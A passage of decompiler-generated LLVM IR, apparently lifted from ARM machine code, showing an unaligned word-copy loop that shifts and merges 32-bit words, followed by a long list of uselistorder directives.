  %v0_176d0 = load i32, i32* %r3.global-to-local, align 4
  %v3_176d0 = mul i32 %v0_176d0, 256
  store i32 %v3_176d0, i32* %ip.global-to-local, align 4
  %v0_176d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_176d4 = add i32 %v0_176d4, -4
  %v2_176d4 = inttoptr i32 %v1_176d4 to i32*
  %v3_176d4 = load i32, i32* %v2_176d4, align 4
  store i32 %v3_176d4, i32* %r3.global-to-local, align 4
  store i32 %v1_176d4, i32* %r1.global-to-local, align 4
  %v4_176d8 = udiv i32 %v3_176d4, 16777216
  %v5_176d8 = or i32 %v4_176d8, %v3_176d0
  store i32 %v5_176d8, i32* @ip, align 4
  %v2_176dc = add i32 %v1_176dc, -4
  %v3_176dc = inttoptr i32 %v2_176dc to i32*
  store i32 %v5_176d8, i32* %v3_176dc, align 4
  %v4_176dc = load i32, i32* %r0.global-to-local, align 4
  %v5_176dc = add i32 %v4_176dc, -4
  store i32 %v5_176dc, i32* %r0.global-to-local, align 4
  %v0_176e0 = load i32, i32* %r2.global-to-local, align 4
  %v2_176e0 = add i32 %v0_176e0, -4
  store i32 %v2_176e0, i32* %r2.global-to-local, align 4
  %v6_176e4 = icmp slt i32 %v0_176e0, 4
  br i1 %v6_176e4, label %dec_label_pc_176e8.loopexit, label %dec_label_pc_176d0

dec_label_pc_176e8.loopexit:                      ; preds = %dec_label_pc_176d0
  %v4_176e0 = sub i32 3, %v0_176e0
  %v5_176e0 = and i32 %v4_176e0, %v0_176e0
  %v6_176e0 = icmp slt i32 %v5_176e0, 0
  %v7_176e0 = icmp slt i32 %v2_176e0, 0
  store i1 %v6_176e0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_176e0, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_176e8

dec_label_pc_176e8:                               ; preds = %dec_label_pc_176e8.loopexit, %dec_label_pc_176c4
  %v2_1762c63 = phi i32 [ %v5_176dc, %dec_label_pc_176e8.loopexit ], [ %v1_176b8, %dec_label_pc_176c4 ]
  %v0_1761c59 = phi i32 [ %v2_176e0, %dec_label_pc_176e8.loopexit ], [ %v2_176c8, %dec_label_pc_176c4 ]
  %v0_176e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_176e8 = add i32 %v0_176e8, 3
  store i32 %v1_176e8, i32* @r1, align 4
  br label %bb143

dec_label_pc_176f0:                               ; preds = %dec_label_pc_17680
  br i1 %v5_17760, label %dec_label_pc_1773c, label %dec_label_pc_176f8

dec_label_pc_176f8:                               ; preds = %dec_label_pc_176f0
  store i32 %v2_1775c, i32* %r2.global-to-local, align 4
  %v3_176fc = load i32, i32* @r4, align 4
  store i32 %v3_176fc, i32* %stack_var_-12, align 4
  %v6_176fc = load i32, i32* @r5, align 4
  %v8_176fc = inttoptr i32 %v6_176fc to i8*
  store i8* %v8_176fc, i8** %stack_var_-8, align 4
  %v11_176fc = load i32, i32* @lr, align 4
  br label %dec_label_pc_17700

dec_label_pc_17700:                               ; preds = %dec_label_pc_17700.dec_label_pc_17700_crit_edge, %dec_label_pc_176f8
  %v0_17724 = phi i32 [ %v1_17724, %dec_label_pc_17700.dec_label_pc_17700_crit_edge ], [ %v0_176b831, %dec_label_pc_176f8 ]
  %v0_17704 = phi i32 [ %v0_17704.pre, %dec_label_pc_17700.dec_label_pc_17700_crit_edge ], [ %v1_17670, %dec_label_pc_176f8 ]
  %v0_17700 = phi i32 [ %v0_17700.pre, %dec_label_pc_17700.dec_label_pc_17700_crit_edge ], [ %v2_17674, %dec_label_pc_176f8 ]
  %v3_17700 = mul i32 %v0_17700, 65536
  store i32 %v3_17700, i32* %lr.global-to-local, align 4
  %v1_17704 = add i32 %v0_17704, -4
  %v2_17704 = inttoptr i32 %v1_17704 to i32*
  %v3_17704 = load i32, i32* %v2_17704, align 4
  store i32 %v3_17704, i32* %r3.global-to-local, align 4
  %v4_17704 = add i32 %v0_17704, -8
  %v5_17704 = inttoptr i32 %v4_17704 to i32*
  %v6_17704 = load i32, i32* %v5_17704, align 4
  store i32 %v6_17704, i32* %r4.global-to-local, align 4
  %v7_17704 = add i32 %v0_17704, -12
  %v8_17704 = inttoptr i32 %v7_17704 to i32*
  %v9_17704 = load i32, i32* %v8_17704, align 4
  store i32 %v9_17704, i32* %r5.global-to-local, align 4
  %v10_17704 = add i32 %v0_17704, -16
  %v11_17704 = inttoptr i32 %v10_17704 to i32*
  %v12_17704 = load i32, i32* %v11_17704, align 4
  store i32 %v10_17704, i32* %r1.global-to-local, align 4
  %v4_17708 = udiv i32 %v12_17704, 65536
  %v5_17708 = or i32 %v4_17708, %v3_17700
  store i32 %v5_17708, i32* %lr.global-to-local, align 4
  %v3_1770c = mul i32 %v12_17704, 65536
  %v4_17710 = udiv i32 %v9_17704, 65536
  %v5_17710 = or i32 %v3_1770c, %v4_17710
  store i32 %v5_17710, i32* @ip, align 4
  %v3_17714 = mul i32 %v9_17704, 65536
  %v4_17718 = udiv i32 %v6_17704, 65536
  %v5_17718 = or i32 %v3_17714, %v4_17718
  store i32 %v5_17718, i32* %r5.global-to-local, align 4
  %v3_1771c = mul i32 %v6_17704, 65536
  %v4_17720 = udiv i32 %v3_17704, 65536
  %v5_17720 = or i32 %v3_1771c, %v4_17720
  store i32 %v5_17720, i32* %r4.global-to-local, align 4
  %v1_17724 = add i32 %v0_17724, -16
  %v2_17724 = inttoptr i32 %v1_17724 to i32*
  store i32 %v5_17720, i32* %v2_17724, align 4
  %v4_17724 = add i32 %v0_17724, -12
  %v5_17724 = inttoptr i32 %v4_17724 to i32*
  %v6_17724 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_17724, i32* %v5_17724, align 4
  %v7_17724 = add i32 %v0_17724, -8
  %v8_17724 = inttoptr i32 %v7_17724 to i32*
  %v9_17724 = load i32, i32* @ip, align 4
  store i32 %v9_17724, i32* %v8_17724, align 4
  %v10_17724 = add i32 %v0_17724, -4
  %v11_17724 = inttoptr i32 %v10_17724 to i32*
  %v12_17724 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_17724, i32* %v11_17724, align 4
  store i32 %v1_17724, i32* %r0.global-to-local, align 4
  %v0_17728 = load i32, i32* %r2.global-to-local, align 4
  %v2_17728 = add i32 %v0_17728, -16
  store i32 %v2_17728, i32* %r2.global-to-local, align 4
  %v6_1772c = icmp slt i32 %v0_17728, 16
  br i1 %v6_1772c, label %dec_label_pc_17730, label %dec_label_pc_17700.dec_label_pc_17700_crit_edge

dec_label_pc_17700.dec_label_pc_17700_crit_edge:  ; preds = %dec_label_pc_17700
  %v0_17700.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_17704.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17700

dec_label_pc_17730:                               ; preds = %dec_label_pc_17700
  %v2_17730 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17730, i32* @r4, align 4
  %v5_17730 = load i8*, i8** %stack_var_-8, align 4
  %v6_17730 = ptrtoint i8* %v5_17730 to i32
  store i32 %v6_17730, i32* @r5, align 4
  store i32 %v11_176fc, i32* @lr, align 4
  %v2_17734 = add i32 %v0_17728, -4
  store i32 %v2_17734, i32* %r2.global-to-local, align 4
  %v4_17734 = add i32 %v0_17728, 2147483632
  %v5_17734 = and i32 %v2_17734, %v4_17734
  %v6_17734 = icmp slt i32 %v5_17734, 0
  store i1 %v6_17734, i1* %cpsr_v.global-to-local, align 1
  %v7_17734 = icmp slt i32 %v2_17734, 0
  store i1 %v7_17734, i1* %cpsr_n.global-to-local, align 1
  %v5_17738 = icmp slt i32 %v2_17728, -12
  br i1 %v5_17738, label %dec_label_pc_17754, label %dec_label_pc_1773c

dec_label_pc_1773c:                               ; preds = %dec_label_pc_17730, %dec_label_pc_176f0, %dec_label_pc_1773c
  %v1_17748 = phi i32 [ %v5_17748, %dec_label_pc_1773c ], [ %v1_17724, %dec_label_pc_17730 ], [ %v0_176b831, %dec_label_pc_176f0 ]
  %v0_1773c = load i32, i32* %r3.global-to-local, align 4
  %v3_1773c = mul i32 %v0_1773c, 65536
  store i32 %v3_1773c, i32* %ip.global-to-local, align 4
  %v0_17740 = load i32, i32* %r1.global-to-local, align 4
  %v1_17740 = add i32 %v0_17740, -4
  %v2_17740 = inttoptr i32 %v1_17740 to i32*
  %v3_17740 = load i32, i32* %v2_17740, align 4
  store i32 %v3_17740, i32* %r3.global-to-local, align 4
  store i32 %v1_17740, i32* %r1.global-to-local, align 4
  %v4_17744 = udiv i32 %v3_17740, 65536
  %v5_17744 = or i32 %v4_17744, %v3_1773c
  store i32 %v5_17744, i32* @ip, align 4
  %v2_17748 = add i32 %v1_17748, -4
  %v3_17748 = inttoptr i32 %v2_17748 to i32*
  store i32 %v5_17744, i32* %v3_17748, align 4
  %v4_17748 = load i32, i32* %r0.global-to-local, align 4
  %v5_17748 = add i32 %v4_17748, -4
  store i32 %v5_17748, i32* %r0.global-to-local, align 4
  %v0_1774c = load i32, i32* %r2.global-to-local, align 4
  %v2_1774c = add i32 %v0_1774c, -4
  store i32 %v2_1774c, i32* %r2.global-to-local, align 4
  %v6_17750 = icmp slt i32 %v0_1774c, 4
  br i1 %v6_17750, label %dec_label_pc_17754.loopexit, label %dec_label_pc_1773c

dec_label_pc_17754.loopexit:                      ; preds = %dec_label_pc_1773c
  %v4_1774c = sub i32 3, %v0_1774c
  %v5_1774c = and i32 %v4_1774c, %v0_1774c
  %v6_1774c = icmp slt i32 %v5_1774c, 0
  %v7_1774c = icmp slt i32 %v2_1774c, 0
  store i1 %v6_1774c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1774c, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_17754

dec_label_pc_17754:                               ; preds = %dec_label_pc_17754.loopexit, %dec_label_pc_17730
  %v2_1762c64 = phi i32 [ %v5_17748, %dec_label_pc_17754.loopexit ], [ %v1_17724, %dec_label_pc_17730 ]
  %v0_1761c60 = phi i32 [ %v2_1774c, %dec_label_pc_17754.loopexit ], [ %v2_17734, %dec_label_pc_17730 ]
  %v0_17754 = load i32, i32* %r1.global-to-local, align 4
  %v1_17754 = add i32 %v0_17754, 2
  store i32 %v1_17754, i32* @r1, align 4
  br label %bb143

dec_label_pc_1775c:                               ; preds = %dec_label_pc_17670
  br i1 %v5_17760, label %dec_label_pc_177a8, label %dec_label_pc_17764

dec_label_pc_17764:                               ; preds = %dec_label_pc_1775c
  store i32 %v2_1775c, i32* %r2.global-to-local, align 4
  %v3_17768 = load i32, i32* @r4, align 4
  store i32 %v3_17768, i32* %stack_var_-12, align 4
  %v6_17768 = load i32, i32* @r5, align 4
  %v8_17768 = inttoptr i32 %v6_17768 to i8*
  store i8* %v8_17768, i8** %stack_var_-8, align 4
  %v11_17768 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1776c

dec_label_pc_1776c:                               ; preds = %dec_label_pc_1776c.dec_label_pc_1776c_crit_edge, %dec_label_pc_17764
  %v0_17790 = phi i32 [ %v1_17790, %dec_label_pc_1776c.dec_label_pc_1776c_crit_edge ], [ %v0_176b831, %dec_label_pc_17764 ]
  %v0_17770 = phi i32 [ %v0_17770.pre, %dec_label_pc_1776c.dec_label_pc_1776c_crit_edge ], [ %v1_17670, %dec_label_pc_17764 ]
  %v0_1776c = phi i32 [ %v0_1776c.pre, %dec_label_pc_1776c.dec_label_pc_1776c_crit_edge ], [ %v2_17674, %dec_label_pc_17764 ]
  %v3_1776c = mul i32 %v0_1776c, 16777216
  store i32 %v3_1776c, i32* %lr.global-to-local, align 4
  %v1_17770 = add i32 %v0_17770, -4
  %v2_17770 = inttoptr i32 %v1_17770 to i32*
  %v3_17770 = load i32, i32* %v2_17770, align 4
  store i32 %v3_17770, i32* %r3.global-to-local, align 4
  %v4_17770 = add i32 %v0_17770, -8
  %v5_17770 = inttoptr i32 %v4_17770 to i32*
  %v6_17770 = load i32, i32* %v5_17770, align 4
  store i32 %v6_17770, i32* %r4.global-to-local, align 4
  %v7_17770 = add i32 %v0_17770, -12
  %v8_17770 = inttoptr i32 %v7_17770 to i32*
  %v9_17770 = load i32, i32* %v8_17770, align 4
  store i32 %v9_17770, i32* %r5.global-to-local, align 4
  %v10_17770 = add i32 %v0_17770, -16
  %v11_17770 = inttoptr i32 %v10_17770 to i32*
  %v12_17770 = load i32, i32* %v11_17770, align 4
  store i32 %v10_17770, i32* %r1.global-to-local, align 4
  %v4_17774 = udiv i32 %v12_17770, 256
  %v5_17774 = or i32 %v4_17774, %v3_1776c
  store i32 %v5_17774, i32* %lr.global-to-local, align 4
  %v3_17778 = mul i32 %v12_17770, 16777216
  %v4_1777c = udiv i32 %v9_17770, 256
  %v5_1777c = or i32 %v3_17778, %v4_1777c
  store i32 %v5_1777c, i32* @ip, align 4
  %v3_17780 = mul i32 %v9_17770, 16777216
  %v4_17784 = udiv i32 %v6_17770, 256
  %v5_17784 = or i32 %v3_17780, %v4_17784
  store i32 %v5_17784, i32* %r5.global-to-local, align 4
  %v3_17788 = mul i32 %v6_17770, 16777216
  %v4_1778c = udiv i32 %v3_17770, 256
  %v5_1778c = or i32 %v3_17788, %v4_1778c
  store i32 %v5_1778c, i32* %r4.global-to-local, align 4
  %v1_17790 = add i32 %v0_17790, -16
  %v2_17790 = inttoptr i32 %v1_17790 to i32*
  store i32 %v5_1778c, i32* %v2_17790, align 4
  %v4_17790 = add i32 %v0_17790, -12
  %v5_17790 = inttoptr i32 %v4_17790 to i32*
  %v6_17790 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_17790, i32* %v5_17790, align 4
  %v7_17790 = add i32 %v0_17790, -8
  %v8_17790 = inttoptr i32 %v7_17790 to i32*
  %v9_17790 = load i32, i32* @ip, align 4
  store i32 %v9_17790, i32* %v8_17790, align 4
  %v10_17790 = add i32 %v0_17790, -4
  %v11_17790 = inttoptr i32 %v10_17790 to i32*
  %v12_17790 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_17790, i32* %v11_17790, align 4
  store i32 %v1_17790, i32* %r0.global-to-local, align 4
  %v0_17794 = load i32, i32* %r2.global-to-local, align 4
  %v2_17794 = add i32 %v0_17794, -16
  store i32 %v2_17794, i32* %r2.global-to-local, align 4
  %v6_17798 = icmp slt i32 %v0_17794, 16
  br i1 %v6_17798, label %dec_label_pc_1779c, label %dec_label_pc_1776c.dec_label_pc_1776c_crit_edge

dec_label_pc_1776c.dec_label_pc_1776c_crit_edge:  ; preds = %dec_label_pc_1776c
  %v0_1776c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_17770.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1776c

dec_label_pc_1779c:                               ; preds = %dec_label_pc_1776c
  %v2_1779c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1779c, i32* @r4, align 4
  %v5_1779c = load i8*, i8** %stack_var_-8, align 4
  %v6_1779c = ptrtoint i8* %v5_1779c to i32
  store i32 %v6_1779c, i32* @r5, align 4
  store i32 %v11_17768, i32* @lr, align 4
  %v2_177a0 = add i32 %v0_17794, -4
  store i32 %v2_177a0, i32* %r2.global-to-local, align 4
  %v4_177a0 = add i32 %v0_17794, 2147483632
  %v5_177a0 = and i32 %v2_177a0, %v4_177a0
  %v6_177a0 = icmp slt i32 %v5_177a0, 0
  store i1 %v6_177a0, i1* %cpsr_v.global-to-local, align 1
  %v7_177a0 = icmp slt i32 %v2_177a0, 0
  store i1 %v7_177a0, i1* %cpsr_n.global-to-local, align 1
  %v5_177a4 = icmp slt i32 %v2_17794, -12
  br i1 %v5_177a4, label %dec_label_pc_177c0, label %dec_label_pc_177a8

dec_label_pc_177a8:                               ; preds = %dec_label_pc_1779c, %dec_label_pc_1775c, %dec_label_pc_177a8
  %v1_177b4 = phi i32 [ %v5_177b4, %dec_label_pc_177a8 ], [ %v1_17790, %dec_label_pc_1779c ], [ %v0_176b831, %dec_label_pc_1775c ]
  %v0_177a8 = load i32, i32* %r3.global-to-local, align 4
  %v3_177a8 = mul i32 %v0_177a8, 16777216
  store i32 %v3_177a8, i32* %ip.global-to-local, align 4
  %v0_177ac = load i32, i32* %r1.global-to-local, align 4
  %v1_177ac = add i32 %v0_177ac, -4
  %v2_177ac = inttoptr i32 %v1_177ac to i32*
  %v3_177ac = load i32, i32* %v2_177ac, align 4
  store i32 %v3_177ac, i32* %r3.global-to-local, align 4
  store i32 %v1_177ac, i32* %r1.global-to-local, align 4
  %v4_177b0 = udiv i32 %v3_177ac, 256
  %v5_177b0 = or i32 %v4_177b0, %v3_177a8
  store i32 %v5_177b0, i32* @ip, align 4
  %v2_177b4 = add i32 %v1_177b4, -4
  %v3_177b4 = inttoptr i32 %v2_177b4 to i32*
  store i32 %v5_177b0, i32* %v3_177b4, align 4
  %v4_177b4 = load i32, i32* %r0.global-to-local, align 4
  %v5_177b4 = add i32 %v4_177b4, -4
  store i32 %v5_177b4, i32* %r0.global-to-local, align 4
  %v0_177b8 = load i32, i32* %r2.global-to-local, align 4
  %v2_177b8 = add i32 %v0_177b8, -4
  store i32 %v2_177b8, i32* %r2.global-to-local, align 4
  %v6_177bc = icmp slt i32 %v0_177b8, 4
  br i1 %v6_177bc, label %dec_label_pc_177c0.loopexit, label %dec_label_pc_177a8

dec_label_pc_177c0.loopexit:                      ; preds = %dec_label_pc_177a8
  %v4_177b8 = sub i32 3, %v0_177b8
  %v5_177b8 = and i32 %v4_177b8, %v0_177b8
  %v6_177b8 = icmp slt i32 %v5_177b8, 0
  %v7_177b8 = icmp slt i32 %v2_177b8, 0
  store i1 %v6_177b8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_177b8, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_177c0

dec_label_pc_177c0:                               ; preds = %dec_label_pc_177c0.loopexit, %dec_label_pc_1779c
  %v2_1762c65 = phi i32 [ %v5_177b4, %dec_label_pc_177c0.loopexit ], [ %v1_17790, %dec_label_pc_1779c ]
  %v0_1761c61 = phi i32 [ %v2_177b8, %dec_label_pc_177c0.loopexit ], [ %v2_177a0, %dec_label_pc_1779c ]
  %v0_177c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_177c0 = add i32 %v0_177c0, 1
  store i32 %v1_177c0, i32* @r1, align 4
  br label %bb143

; uselistorder directives
  uselistorder i32 %v5_177b4, { 0, 2, 1 }
  uselistorder i32 %v3_177a8, { 1, 0 }
  uselistorder i32 %v2_177a0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_17790, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_17770, { 1, 0 }
  uselistorder i32 %v3_1776c, { 1, 0 }
  uselistorder i32 %v0_17770, { 3, 2, 1, 0 }
  uselistorder i32 %v0_17790, { 3, 2, 1, 0 }
  uselistorder i32 %v5_17748, { 0, 2, 1 }
  uselistorder i32 %v3_1773c, { 1, 0 }
  uselistorder i32 %v2_17734, { 0, 2, 1, 3 }
  uselistorder i32 %v1_17724, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_17704, { 1, 0 }
  uselistorder i32 %v3_17700, { 1, 0 }
  uselistorder i32 %v0_17704, { 3, 2, 1, 0 }
  uselistorder i32 %v0_17724, { 3, 2, 1, 0 }
  uselistorder i32 %v5_176dc, { 0, 2, 1 }
  uselistorder i32 %v3_176d0, { 1, 0 }
  uselistorder i32 %v2_176c8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_176b8, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_17698, { 1, 0 }
  uselistorder i32 %v3_17694, { 1, 0 }
  uselistorder i32 %v0_17698, { 3, 2, 1, 0 }
  uselistorder i32 %v0_176b8, { 3, 2, 1, 0 }
  uselistorder i1 %v5_17760, { 2, 0, 1 }
  uselistorder i32 %v0_17678, { 1, 0 }
  uselistorder i32 %v0_17764, { 3, 0, 2, 1 }
  uselistorder i32 %v0_176b831, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_17668, { 2, 1, 0 }
  uselistorder i32 %v0_17668, { 2, 0, 1 }
  uselistorder i32 %v2_17660, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_17660, { 1, 0, 2 }
  uselistorder i32 %v0_17660, { 2, 0, 1, 3 }
  uselistorder i32 %v0_176b832, { 2, 1, 0 }
  uselistorder i32 %v11_1763c, { 1, 0 }
  uselistorder i32 %v7_1763c, { 1, 0 }
  uselistorder i32 %v1_1761c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_1761c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_17620, { 1, 0 }
  uselistorder i32 %v7_17614, { 0, 2, 1 }
  uselistorder i32 %v10_17610, { 1, 0 }
  uselistorder i32 %v9_17608, { 1, 0, 2 }
  uselistorder i32 %v6_17604, { 1, 0 }
  uselistorder i32 %v2_175fc, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_175fc, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_1760c, { 0, 3, 2, 1 }
  uselistorder i32 %v7_175f0, { 0, 2, 1 }
  uselistorder i32 %v13_175ec, { 1, 0 }
  uselistorder i32 %v4_175e8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_175e8, { 2, 0, 1 }
  uselistorder i32 %v6_175f0, { 0, 3, 2, 1 }
  uselistorder i32 %v7_175e0, { 0, 2, 1 }
  uselistorder i32 %v16_175dc, { 1, 0 }
  uselistorder i32 %v4_175d8, { 1, 0 }
  uselistorder i32 %v0_175e8.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_175e0, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_175cc, { 0, 3, 2, 1 }
  uselistorder i32 %v10_175c8, { 1, 0 }
  uselistorder i32 %v1_175c4, { 1, 0 }
  uselistorder i32 %v10_175c0, { 1, 0 }
  uselistorder i32 %v0_175c0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_175c4, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_175b8, { 0, 2, 1 }
  uselistorder i32 %v2_175ac, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_175ac, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v0_175c449, { 1, 2, 0 }
  uselistorder i32 %v1_175a4, { 2, 1, 0 }
  uselistorder i32 %v1_1759c, { 2, 3, 1, 0 }
  uselistorder i32 %v2_17594, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_17590, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_1758c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_1758c, { 3, 0, 5, 4, 1, 2 }
  uselistorder i32 %v4_17578, { 0, 2, 1 }
  uselistorder i32 %v3_1756c, { 1, 0 }
  uselistorder i32 %v2_17564, { 0, 2, 1, 3 }
  uselistorder i32 %v12_17554, { 1, 0, 3, 2 }
  uselistorder i32 %v8_17534, { 1, 0, 2 }
  uselistorder i32 %v5_17534, { 1, 0, 2 }
  uselistorder i32 %v2_17534, { 1, 0, 2 }
  uselistorder i32 %v3_17530, { 1, 0 }
  uselistorder i32 %v0_17534, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_17554, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_1750c, { 0, 2, 1 }
  uselistorder i32 %v3_17500, { 1, 0 }
  uselistorder i32 %v2_174f8, { 0, 2, 1, 3 }
  uselistorder i32 %v12_174e8, { 1, 0, 3, 2 }
  uselistorder i32 %v8_174c8, { 1, 0, 2 }
  uselistorder i32 %v5_174c8, { 1, 0, 2 }
  uselistorder i32 %v2_174c8, { 1, 0, 2 }
  uselistorder i32 %v3_174c4, { 1, 0 }
  uselistorder i32 %v0_174c8, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_174e8, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_174a0, { 0, 2, 1 }
  uselistorder i32 %v3_17494, { 1, 0 }
  uselistorder i32 %v2_1748c, { 0, 2, 1, 3 }
  uselistorder i32 %v12_1747c, { 1, 0, 3, 2 }
  uselistorder i32 %v8_1745c, { 1, 0, 2 }
  uselistorder i32 %v5_1745c, { 1, 0, 2 }
  uselistorder i32 %v2_1745c, { 1, 0, 2 }
  uselistorder i32 %v3_17458, { 1, 0 }
  uselistorder i32 %v0_1745c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1747c, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v5_17524, { 2, 0, 1 }
  uselistorder i32 %v0_17528, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1747c75, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_1742c, { 1, 0 }
  uselistorder i32 %v0_1742c, { 3, 1, 0, 2 }
  uselistorder i32 %v2_17424, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_17424, { 1, 0, 2 }
  uselistorder i32 %v0_17424, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1747c76, { 2, 1, 0 }
  uselistorder i32 %v1_17404, { 1, 0, 2 }
  uselistorder i32 %v1_173dc, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_173dc, { 1, 2, 0, 3 }
  uselistorder i32 %v8_173c8, { 1, 0, 2 }
  uselistorder i32 %v6_173c4, { 1, 0 }
  uselistorder i32 %v2_173bc, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_173bc, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_173cc, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v4_173b4, { 0, 2, 1 }
  uselistorder i1 %v0_173b4, { 1, 0 }
  uselistorder i1 %v1_173b4, { 1, 0 }
  uselistorder i32 %v3_173b0, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_173a8, { 0, 2, 1, 3 }
  uselistorder i32 %v4_17394, { 1, 0 }
  uselistorder i32 %v12_17388, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1737c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_17380, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v2_17370, { 0, 2, 1 }
  uselistorder i32 %v2_17368, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_17368, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v1_17360, { 1, 0 }
  uselistorder i32 %v1_17358, { 2, 1, 0 }
  uselistorder i32 %v2_17350, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_17350, { 1, 0, 2, 3 }
  uselistorder i32 %v2_17340, { 1, 0 }
  uselistorder i32 %v1_17340, { 1, 5, 3, 4, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_17340, { 1, 7, 9, 8, 6, 4, 0, 5, 11, 2, 3, 10, 12 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 15, 16, 17, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 24, 25, 26, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r3.global-to-local, { 0, 9, 1, 2, 3, 10, 4, 5, 6, 11, 7, 8, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 39, 40, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder i32* %r2.global-to-local, { 0, 30, 1, 2, 3, 4, 5, 31, 6, 7, 8, 9, 10, 32, 11, 12, 13, 14, 15, 33, 16, 18, 17, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 34, 60, 68, 61, 62, 63, 64, 35, 65, 36, 37, 38, 39, 40, 66, 41, 42, 43, 44, 45, 67, 46, 48, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 69 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 12, 2, 3, 6, 4, 13, 5, 7, 10, 8, 14, 9, 11, 15, 16, 17, 34, 32, 35, 33, 36, 20, 18, 26, 19, 21, 24, 22, 27, 23, 25, 28, 29, 30, 31 }
  uselistorder i32* %r0.global-to-local, { 3, 25, 4, 5, 26, 6, 7, 27, 8, 9, 10, 11, 12, 13, 28, 14, 16, 15, 17, 18, 29, 19, 20, 30, 21, 22, 23, 24, 31, 57, 59, 60, 32, 39, 33, 34, 40, 35, 36, 37, 38, 41, 42, 0, 43, 44, 46, 45, 47, 48, 58, 49, 50, 51, 54, 52, 53, 55, 56, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 11, 12, 5, 6, 7, 8, 9, 10, 13 }
  uselistorder i1* %cpsr_v.global-to-local, { 5, 7, 6, 9, 4, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 0, 39, 1, 24, 2, 25, 40, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 41, 42 }
  uselistorder i1* %cpsr_n.global-to-local, { 5, 7, 6, 9, 4, 10, 8, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 0, 44, 1, 27, 2, 28, 45, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 46, 47, 48 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -5, { 1, 0, 2 }
